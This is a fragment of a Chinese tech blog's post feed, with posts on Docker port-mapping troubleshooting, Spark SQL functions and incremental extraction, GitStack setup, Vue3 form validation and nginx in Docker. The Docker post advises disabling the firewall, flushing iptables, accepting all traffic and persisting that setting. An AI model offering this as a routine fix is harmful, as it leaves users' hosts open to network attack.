<td>作者</td>
</tr>
<tr>
<td>description</td>
<td>视频简介</td>
</tr>
<tr>
<td>tag</td>
<td>标签</td>
</tr>
<tr>
<td>favorites</td>
<td>收藏</td>
</tr>
<tr>
<td>coins</td>
<td>投币</td>
</tr>
<tr>
<td>danmu</td>
<td>弹幕</td>
</tr>
<tr>
<td>likes</td>
<td>点赞</td>
</tr>
<tr>
<td>reply</td>
<td>评论</td>
</tr>
<tr>
<td>views</td>
<td>播放量</td>
</tr>
<tr>
<td>share</td>
<td>分享</td>
</tr>
</tbody>
</table>
<h4 id="任务要求-7">任务要求</h4>
<ol>
<li>程序接收 str 类型的变量 author，返回结果的数据类型是str类型；</li>
<li>便于数据美观，IFL 的值需要保留小数点后两位（四舍五入）；</li>
<li>数据中可能存在重复数据；</li>
<li>某知名视频网站视频数据为逗号分割的 csv 文件，utf-8 编码。</li>
</ol>
<h4 id="测试用例-7">测试用例</h4>
<p>输入：‘龙爪洪荒’<br>
输出：‘高质量拖更视频主’</p>
<p>输入：‘AO摆渡人’<br>
输出：‘活跃视频主’</p>
<p><a href="http://72.itmc.org.cn:80/JS001/data/user/15960/94/fj_B_video_web_data.csv">某知名视频网站视频数据.csv</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">代码暂无</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Pandas</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>docker 映射端口外部设备访问不到</title>
    <url>/posts/fa5b3dfc/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="容器内部">容器内部</h3>
<p>查看服务是否开启，以nginx为例</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -ef | grep nginx</span><br></pre></td></tr></table></figure>
<p>返回类似于以下图片，说明服务已经启动<br>
<img src="ps.png" alt=""></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld</span><br></pre></td></tr></table></figure>
<p>如果容器有防火墙，可以先关闭防火墙试一下<br>
先查一下防火墙的状态，如果为下图就是关着呢<br>
<img src="firewalld.png" alt=""></p>
<h3 id="宿主机">宿主机</h3>
<p>先看容器是否正确映射端口<br>
下图画红框的地方就是将容器内部的nginx服务映射到宿主机的32770端口，如果这里没有映射，那么外部设备肯定访问不到。<br>
<img src="a.png" alt=""></p>
<p>查看宿主机端口是否开启</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ss -tlnp | grep 32770</span><br></pre></td></tr></table></figure>
<p>类似于以下输出，说明端口没问题<br>
<img src="b.png" alt=""><br>
如果还是访问不了，那么就是防火墙的问题了，可以尝试关闭防火墙。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld</span><br></pre></td></tr></table></figure>
<p>类似于下图就是关着呢<br>
<img src="c.png" alt=""><br>
配置iptables使得所有流量都允许，可以通过以下命令清除当前的规则并设置允许所有的流量。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> iptables -F   <span class="comment"># 清除所有链中的规则</span></span><br><span class="line"><span class="built_in">sudo</span> iptables -X   <span class="comment"># 删除所有自定义链</span></span><br><span class="line"><span class="built_in">sudo</span> iptables -Z   <span class="comment"># 清空规则链中的计数器</span></span><br></pre></td></tr></table></figure>
<p>设置默认链为 ACCEPT，表示允许所有的传入、传出流量。执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> iptables -P INPUT ACCEPT    <span class="comment"># 允许所有进入流量</span></span><br><span class="line"><span class="built_in">sudo</span> iptables -P FORWARD ACCEPT  <span class="comment"># 允许所有转发流量</span></span><br><span class="line"><span class="built_in">sudo</span> iptables -P OUTPUT ACCEPT   <span class="comment"># 允许所有输出流量</span></span><br></pre></td></tr></table></figure>
<p>无需重启，立刻生效</p>
<p>默认情况下，iptables 规则在系统重启后会丢失。</p>
<p>根据系统版本不同，可以上网搜索对应的方法，将iptables规则保存下来，防止重启后失效。</p>
<h3 id="容器内部-2">容器内部</h3>
<p>外部设备访问 <a href="http://xn--tiq524a71i">http://宿主机</a>:映射的端口 如果是以下页面，说明连接没问题，大概率是内部服务或代理的问题</p>
<p><img src="d.png" alt=""></p>
<p>我这里是后端的jar包端口映射错了，需要改运行的端口为8080</p>
<p>直接用命令复制jar包到宿主机再复制到本地windows电脑下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">cp</span> b634d0b5d430:/root/question-1.0.jar ./</span><br></pre></td></tr></table></figure>
<p>然后用解压工具打开question-1.0.jar，修改 BOOT-INF\classes\目录下的application.yml文件<br>
<img src="f.png" alt=""><br>
<img src="e.png" alt=""></p>
<p>再复制回docker中，重新运行jar包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">cp</span> ./question-1.0.jar b634d0b5d430:/root/question-1.0.jar</span><br></pre></td></tr></table></figure>
<p>先查看之前运行的任务，然后结束他<br>
<img src="g.png" alt=""><br>
<img src="i.png" alt=""></p>
<p>结束之后重新运行，因为之前已经复制jar包到容器中，所以直接运行就OK<br>
这里的  nohup command &amp;  是让jar包在后台运行<br>
<img src="j.png" alt=""></p>
<p>运行后可以看一下 nohup 的日志文件看看运行成功没有，这样是运行成功了。<br>
<img src="h.png" alt=""></p>
]]></content>
  </entry>
  <entry>
    <title>Spark Sql 常用函数 (Scala 语言)</title>
    <url>/posts/eca3873f/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>基于 org.apache.spark.sql.functions._ 包下的函数</p>
<h3 id="col">col</h3>
<p>用于在DataFrame或Dataset中引用列，通常与Spark的SQL查询或者DataFrame操作一起使用。<br>
语法：</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">col(colName: <span class="type">String</span>): <span class="type">Column</span></span><br></pre></td></tr></table></figure>
<h3 id="column">column</h3>
<p>与 col 函数功能相同。</p>
<h3 id="lit">lit</h3>
<p>用于将一个常量值转换为 Column 类型，以便在 Spark SQL 操作中使用。</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">lit(literal: <span class="type">Any</span>): <span class="type">Column</span></span><br></pre></td></tr></table></figure>
<h3 id="typeLit">typeLit</h3>
<p>typedLit 函数是一个类型安全的版本的 lit 函数。它用于将字面量（常量）转换为指定类型的 Column，并确保在编译时类型匹配。typedLit 适用于 Spark 3.x 版本，提供比 lit 更严格的类型检查，从而避免潜在的类型不匹配问题。</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">typedLit[<span class="type">T</span>: <span class="type">TypeTag</span>](literal: <span class="type">T</span>): <span class="type">Column</span></span><br></pre></td></tr></table></figure>
<h3 id="greatest">greatest</h3>
<p>用于比较多列的值，返回每行中这些列中的最大值。</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">greatest(exprs: <span class="type">Column</span>*): <span class="type">Column</span></span><br><span class="line">greatest(columnName: <span class="type">String</span>, columnNames: <span class="type">String</span>*): <span class="type">Column</span></span><br></pre></td></tr></table></figure>
<h3 id="current-date">current_date</h3>
<p>返回当前的日期（以 yyyy-MM-dd 格式表示）。</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">current_date(): <span class="type">Column</span></span><br></pre></td></tr></table></figure>
<h3 id="date-sub">date_sub</h3>
<p>用于从指定的日期中减去给定的天数，并返回新的日期。</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">date_sub(start: <span class="type">Column</span>, days: <span class="type">Int</span>): <span class="type">Column</span></span><br></pre></td></tr></table></figure>
<h3 id="date-format">date_format</h3>
<p>用于将日期类型的数据格式化为指定的字符串格式。</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">date_format(dateExpr: <span class="type">Column</span>, format: <span class="type">String</span>): <span class="type">Column</span></span><br></pre></td></tr></table></figure>
<h3 id="when">when</h3>
<p>条件表达式，通常与 otherwise() 函数一起使用，用于根据条件返回不同的值。</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">when(condition: <span class="type">Column</span>, value: <span class="type">Any</span>): <span class="type">Column</span></span><br><span class="line">    .otherwise(value: <span class="type">Any</span>): <span class="type">Column</span></span><br></pre></td></tr></table></figure>
<h3 id="max">max</h3>
<p>它通常用于对数值型数据进行分组聚合，或者在没有分组时返回整个列的最大值。</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">max(e: <span class="type">Column</span>): <span class="type">Column</span></span><br></pre></td></tr></table></figure>
<h3 id="to-timestamp">to_timestamp</h3>
<p>将一个字符串或者日期列转换为 timestamp 类型。</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">to_timestamp(s: <span class="type">Column</span>): <span class="type">Column</span></span><br><span class="line">to_timestamp(s: <span class="type">Column</span>, fmt: <span class="type">String</span>): <span class="type">Column</span></span><br></pre></td></tr></table></figure>
<h3 id="row-number">row_number</h3>
<p>用于为每个分组中的行分配一个唯一的递增整数值。它通常与窗口函数一起使用，以实现更复杂的分组和排序操作。<br>
以下示例是基于 id 列进行分组，并按照 time 列进行降序排序，为每个分组中的行分配一个唯一的行号。</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">row_number()</span><br><span class="line">    .over(</span><br><span class="line">        <span class="type">Window</span></span><br><span class="line">            .partitionBy(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">            .orderBy(desc(<span class="string">&quot;time&quot;</span>))</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Spark</tag>
        <tag>Scala</tag>
      </tags>
  </entry>
  <entry>
    <title>Spark 增量抽取 (Scala 实现)</title>
    <url>/posts/98adaf32/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="题目">题目</h3>
<p>编写Scala代码，使用Spark将MySQL的shtd_store库中表user_info、sku_info、base_province、base_region、order_info、order_detail的数据增量抽取到Hive的ods库中对应表user_info、sku_info、base_province、base_region、order_info、order_detail中。(若ods库中部分表没有数据，正常抽取即可)</p>
<h3 id="第一题">第一题</h3>
<p>1、抽取shtd_store库中user_info的增量数据进入Hive的ods库中表user_info。根据ods.user_info表中operate_time或create_time作为增量字段(即MySQL中每条数据取这两个时间中较大的那个时间作为增量字段去和ods里的这两个字段中较大的时间进行比较)，只将新增的数据抽入，字段名称、类型不变，同时添加静态分区，分区字段为etl_date，类型为String，且值为当前比赛日的前一天日期（分区字段格式为yyyyMMdd）。使用hive cli执行show partitions ods.user_info命令。</p>
<h4 id="代码">代码</h4>
<p><img src="code.png" alt=""><br>
<img src="a.png" alt=""></p>
<h3 id="第二题">第二题</h3>
<p>2、	抽取shtd_store库中sku_info的增量数据进入Hive的ods库中表sku_info。根据ods.sku_info表中create_time作为增量字段，只将新增的数据抽入，字段名称、类型不变，同时添加静态分区，分区字段为etl_date，类型为String，且值为当前比赛日的前一天日期（分区字段格式为yyyyMMdd）。使用hive cli执行show partitions ods.sku_info命令。</p>
<h4 id="代码-2">代码</h4>
<p><img src="b.png" alt=""><br>
<img src="c.png" alt=""></p>
]]></content>
      <tags>
        <tag>Spark</tag>
        <tag>Scala</tag>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title>安装并使用 GitStack</title>
    <url>/posts/7baecab0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="下载-GitStack">下载 GitStack</h3>
<p><a href="https://gitstack.com/download/">下载地址</a></p>
<h3 id="安装-GitStack">安装 GitStack</h3>
<ol>
<li>下载完成后，双击运行 <code>GitStackSetup.exe</code> 文件，点击 <code>Next</code>。<br>
<img src="a.png" alt=""></li>
<li>点击 <code>I Agree</code>。<br>
<img src="b.png" alt=""></li>
<li>选择安装位置，点击 <code>Next</code>。<br>
<img src="c.png" alt=""></li>
<li>画红框的必须全选，不然会出一些意想不到的错误，而后点击 <code>Install</code><br>
<img src="d.png" alt=""></li>
<li>如果选择了Launch GitStack选项，那么点击<code>Finish</code>后会自动打开GitStack的管理页面。安装完成后，点击 <code>Finish</code>。<br>
<img src="e.png" alt=""></li>
</ol>
<h3 id="使用-GitStack">使用 GitStack</h3>
<ol>
<li>打开浏览器，输入<code>http://localhost/gitstack</code>，跳转到以下页面，默认用户名密码是admin/admin，点击<code>Sign In</code>登录。<br>
<img src="f.png" alt=""></li>
<li>登录成功后，可以在这里添加一个新的仓库，输入新仓库的名称(字母和数字组合)，而后点击<code>Create</code>。<br>
<img src="g.png" alt=""></li>
</ol>
]]></content>
      <tags>
        <tag>GitStack</tag>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3 + Element Plus 自定义验证</title>
    <url>/posts/f5b25be3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> type &#123;<span class="title class_">FormInstance</span>, <span class="title class_">FormRules</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;element-plus&#x27;</span></span><br><span class="line"><span class="comment">// 判断是否是移动端的函数</span></span><br><span class="line"><span class="keyword">import</span> &#123;isMobileDevice&#125; <span class="keyword">from</span> <span class="string">&quot;@/utils/commonMethod&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义表单数据类型</span></span><br><span class="line">interface <span class="title class_">RuleForm</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: string</span><br><span class="line">  <span class="attr">password</span>: string</span><br><span class="line">  <span class="attr">confirmPassword</span>: string</span><br><span class="line">  <span class="attr">email</span>: string</span><br><span class="line">  <span class="attr">code</span>: string</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取表单实例，常量名对应ref属性</span></span><br><span class="line"><span class="keyword">const</span> ruleFormRef = ref&lt;<span class="title class_">FormInstance</span>&gt;()</span><br><span class="line"><span class="comment">// 以下两个 validate* 函数，必须调用回调函数，否则最后提交会卡住</span></span><br><span class="line"><span class="comment">// 定义验证确认密码函数</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">validatePass</span> = (<span class="params">rule: object, value: string, callback: (error?: <span class="built_in">Error</span>) =&gt; <span class="keyword">void</span></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (value !== form.<span class="property">password</span>) &#123;</span><br><span class="line">    <span class="title function_">callback</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;两次密码不一致&quot;</span>))</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_">callback</span>()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 定义验证邮箱函数</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">validateEmail</span> = (<span class="params">rule: object, value: string, callback: (error?: <span class="built_in">Error</span>) =&gt; <span class="keyword">void</span></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> reg = <span class="regexp">/^[A-Za-z0-9_\-]+(\.[A-Za-z0-9_\-]+)*@[A-Za-z0-9\-]+\.[A-Za-z]&#123;2,&#125;$/</span></span><br><span class="line">  <span class="keyword">if</span> (!reg.<span class="title function_">test</span>(value)) &#123;</span><br><span class="line">    <span class="title function_">callback</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;邮箱不合法&quot;</span>))</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_">callback</span>()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 定义表单数据</span></span><br><span class="line"><span class="keyword">const</span> form = reactive&lt;<span class="title class_">RuleForm</span>&gt;(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  <span class="attr">password</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  <span class="attr">confirmPassword</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  <span class="attr">email</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  <span class="attr">code</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 定义表单验证规则</span></span><br><span class="line"><span class="keyword">const</span> rules = reactive&lt;<span class="title class_">FormRules</span>&lt;<span class="title class_">RuleForm</span>&gt;&gt;(&#123;</span><br><span class="line">  <span class="attr">name</span>: [</span><br><span class="line">    &#123;<span class="attr">required</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&#x27;请输入昵称&#x27;</span>, <span class="attr">trigger</span>: <span class="string">&#x27;blur&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">min</span>: <span class="number">1</span>, <span class="attr">max</span>: <span class="number">20</span>, <span class="attr">message</span>: <span class="string">&#x27;长度应是1-20&#x27;</span>, <span class="attr">trigger</span>: <span class="string">&#x27;blur&#x27;</span>&#125;,</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">email</span>: [</span><br><span class="line">    &#123;<span class="attr">required</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&#x27;请输入邮箱&#x27;</span>, <span class="attr">trigger</span>: <span class="string">&#x27;blur&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">validator</span>: validateEmail, <span class="attr">trigger</span>: <span class="string">&#x27;blur&#x27;</span>&#125;,</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">code</span>: [</span><br><span class="line">    &#123;<span class="attr">required</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&#x27;请输入邮箱验证码&#x27;</span>, <span class="attr">trigger</span>: <span class="string">&#x27;blur&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">min</span>: <span class="number">6</span>, <span class="attr">max</span>: <span class="number">6</span>, <span class="attr">message</span>: <span class="string">&#x27;长度应是6&#x27;</span>, <span class="attr">trigger</span>: <span class="string">&#x27;blur&#x27;</span>&#125;,</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">password</span>: [</span><br><span class="line">    &#123;<span class="attr">required</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&#x27;请输入密码&#x27;</span>, <span class="attr">trigger</span>: <span class="string">&#x27;blur&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">min</span>: <span class="number">8</span>, <span class="attr">max</span>: <span class="number">16</span>, <span class="attr">message</span>: <span class="string">&#x27;长度应是8-16&#x27;</span>, <span class="attr">trigger</span>: <span class="string">&#x27;blur&#x27;</span>&#125;,</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">confirmPassword</span>: [</span><br><span class="line">    &#123;<span class="attr">required</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&#x27;请确认密码&#x27;</span>, <span class="attr">trigger</span>: <span class="string">&#x27;blur&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">validator</span>: validatePass, <span class="attr">trigger</span>: <span class="string">&#x27;blur&#x27;</span>&#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 提交表单</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">submitForm</span> = (<span class="params">formEl: FormInstance | <span class="literal">undefined</span></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (!formEl) <span class="keyword">return</span></span><br><span class="line"><span class="comment">// 如果上面的两个 validate* 函数没有调用回调函数，则这里会卡住</span></span><br><span class="line">  formEl.<span class="title function_">validate</span>(<span class="function">(<span class="params">valid</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(valid)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 重置表单</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">resetForm</span> = (<span class="params">formEl: FormInstance | <span class="literal">undefined</span></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (!formEl) <span class="keyword">return</span></span><br><span class="line">  formEl.<span class="title function_">resetFields</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> timer = <span class="title function_">ref</span>(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">const</span> show = <span class="title function_">ref</span>(<span class="literal">true</span>)</span><br><span class="line"><span class="keyword">const</span> count = <span class="title function_">ref</span>(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">const</span> time = <span class="number">120</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">getCode</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="comment">//axios请求</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(form.<span class="property">email</span>);</span><br><span class="line">  <span class="comment">// 验证码倒计时</span></span><br><span class="line">  <span class="keyword">if</span> (timer.<span class="property">value</span> === <span class="number">0</span>) &#123;</span><br><span class="line">    count.<span class="property">value</span> = time;</span><br><span class="line">    show.<span class="property">value</span> = <span class="literal">false</span>;</span><br><span class="line">    timer.<span class="property">value</span> = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (count.<span class="property">value</span> &gt; <span class="number">0</span> &amp;&amp; count.<span class="property">value</span> &lt;= time) &#123;</span><br><span class="line">        count.<span class="property">value</span>--;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        show.<span class="property">value</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="built_in">clearInterval</span>(timer.<span class="property">value</span>);</span><br><span class="line">        timer.<span class="property">value</span> = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;registry&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;&#123;width: isMobileDevice() ? &#x27;90%&#x27; : &#x27;50%&#x27;&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>注册<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-form</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:ref</span>=<span class="string">&quot;ruleFormRef&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:model</span>=<span class="string">&quot;form&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:rules</span>=<span class="string">&quot;rules&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">label-width</span>=<span class="string">&quot;auto&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">class</span>=<span class="string">&quot;demo-ruleForm&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">size</span>=<span class="string">&quot;default&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">status-icon</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">&quot;昵称&quot;</span> <span class="attr">prop</span>=<span class="string">&quot;name&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-input</span> <span class="attr">v-model</span>=<span class="string">&quot;form.name&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">&quot;邮箱&quot;</span> <span class="attr">prop</span>=<span class="string">&quot;email&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-input</span> <span class="attr">v-model</span>=<span class="string">&quot;form.email&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">&quot;验证码&quot;</span> <span class="attr">prop</span>=<span class="string">&quot;code&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-input</span> <span class="attr">v-model</span>=<span class="string">&quot;form.code&quot;</span> <span class="attr">style</span>=<span class="string">&quot;flex:10;&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">&quot;success&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;getCode&quot;</span> <span class="attr">round</span> <span class="attr">style</span>=<span class="string">&quot;flex: 1;margin: 0 0 0 1rem&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-show</span>=<span class="string">&quot;show&quot;</span>&gt;</span>发送验证码<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-show</span>=<span class="string">&quot;!show&quot;</span>&gt;</span>&#123;&#123; count &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">&quot;密码&quot;</span> <span class="attr">prop</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;form.password&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">&quot;确认密码&quot;</span> <span class="attr">prop</span>=<span class="string">&quot;confirmPassword&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;form.confirmPassword&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-form-item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">&quot;success&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;submitForm(ruleFormRef)&quot;</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-button</span> @<span class="attr">click</span>=<span class="string">&quot;resetForm(ruleFormRef)&quot;</span>&gt;</span>Reset<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>docker 部署 nginx</title>
    <url>/posts/837c427b/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="1-拉取-nginx-镜像">1. 拉取 nginx 镜像</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull nginx</span><br></pre></td></tr></table></figure>
<h3 id="2-运行容器">2. 运行容器</h3>
<p>这里我映射到了本地的9000端口，可以根据需要修改</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --name nginx -p 9000:80 -d nginx</span><br></pre></td></tr></table></figure>
<h3 id="3-浏览器访问">3. 浏览器访问</h3>
<p>浏览器访问 <code>http://ip:9000</code>，如果看到下图则表示 nginx 部署成功<br>
<img src="a.png" alt=""></p>
]]></content>
      <tags>
        <tag>docker</tag>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring Boot 3.4.1 + Spring security 6.4.2 重写登录</title>
    <url>/posts/86d63d83/</url>
